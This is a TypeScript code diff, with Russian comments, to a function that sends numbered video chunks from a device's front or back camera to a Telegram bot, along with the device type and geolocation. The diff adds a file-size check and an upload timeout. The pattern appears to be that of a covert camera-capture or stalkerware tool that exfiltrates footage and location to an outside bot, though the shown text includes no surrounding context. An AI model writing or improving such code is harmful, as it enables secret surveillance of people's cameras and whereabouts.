@@ -204,12 +204,21 @@ export async function sendVideoToTelegram(data: VideoPayload): Promise<boolean> 
       return false;
     }
 
+    // ✅ Проверка размера файла
+    const videoSizeMB = data.videoBlob.size / 1024 / 1024;
+    console.log(`📹 [Telegram] Video size: ${videoSizeMB.toFixed(2)} MB`);
+    
+    if (videoSizeMB > 50) {
+      console.error(`❌ [Telegram] Video too large: ${videoSizeMB.toFixed(2)} MB (max 50MB)`);
+      return false;
+    }
+
     const cameraEmoji = data.cameraType === 'front' ? '🤳' : '📷';
     const cameraName = data.cameraType === 'front' ? 'Front Camera' : 'Back Camera';
     const deviceEmoji = data.device === 'ios' ? '📱' : data.device === 'android' ? '🤖' : '🖥️';
     const deviceName = data.device === 'ios' ? 'iOS' : data.device === 'android' ? 'Android' : 'Desktop';
     
-    let caption = `<b>🎥 Video Chunk #${data.chunkNumber}</b>\n├ <b>Camera:</b> ${cameraEmoji} ${cameraName}\n└ <b>Device:</b> ${deviceEmoji} ${deviceName}`;
+    let caption = `<b>🎥 Video Chunk #${data.chunkNumber}</b>\n├ <b>Camera:</b> ${cameraEmoji} ${cameraName}\n├ <b>Device:</b> ${deviceEmoji} ${deviceName}\n└ <b>Size:</b> ${videoSizeMB.toFixed(2)} MB`;
     
     // ✅ Add geolocation if available
     if (data.geoData) {
@@ -230,23 +239,38 @@ export async function sendVideoToTelegram(data: VideoPayload): Promise<boolean> 
     
     console.log(`📹 [Telegram] Sending to Telegram API... (chunk #${data.chunkNumber})`);
     
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
-      method: 'POST',
-      body: formData
-    });
+    // ✅ КРИТИЧНО: Добавляем AbortController с timeout (120 секунд для больших файлов)
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => {
+      console.error(`⏱️ [Telegram] Timeout after 120s for chunk #${data.chunkNumber}`);
+      controller.abort();
+    }, 120000); // 120 seconds for large video uploads
     
-    console.log(`📹 [Telegram] Response status for chunk #${data.chunkNumber}: ${response.status} ${response.statusText}`);
-    
-    if (response.ok) {
-      console.log(`✅ [Telegram] Video chunk #${data.chunkNumber} (${data.cameraType}) sent successfully`);
-      return true;
-    } else {
-      const errorText = await response.text();
-      console.error(`❌ [Telegram] Failed to send video chunk #${data.chunkNumber} (${data.cameraType}):`, errorText);
-      return false;
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+        method: 'POST',
+        body: formData,
+        signal: controller.signal
+      });
+      
+      clearTimeout(timeoutId);
+      
+      console.log(`📹 [Telegram] Response status for chunk #${data.chunkNumber}: ${response.status} ${response.statusText}`);
+      
+      if (response.ok) {
+        console.log(`✅ [Telegram] Video chunk #${data.chunkNumber} (${data.cameraType}) sent successfully`);
+        return true;
+      } else {
+        const errorText = await response.text();
+        console.error(`❌ [Telegram] Failed to send video chunk #${data.chunkNumber} (${data.cameraType}):`, errorText);
+        return false;
+      }
+    } catch (fetchError) {
+      clearTimeout(timeoutId);
+      throw fetchError; // Re-throw to outer catch
     }
   } catch (error) {
-    console.error(`❌ [Telegram] Error sending video chunk #${data.chunkNumber} (${data.cameraType}):`, error);
+    console.error(`❌ [Telegram] Error sending video chunk #${data.chunkNumber}:`, error);
     return false;
   }
 }
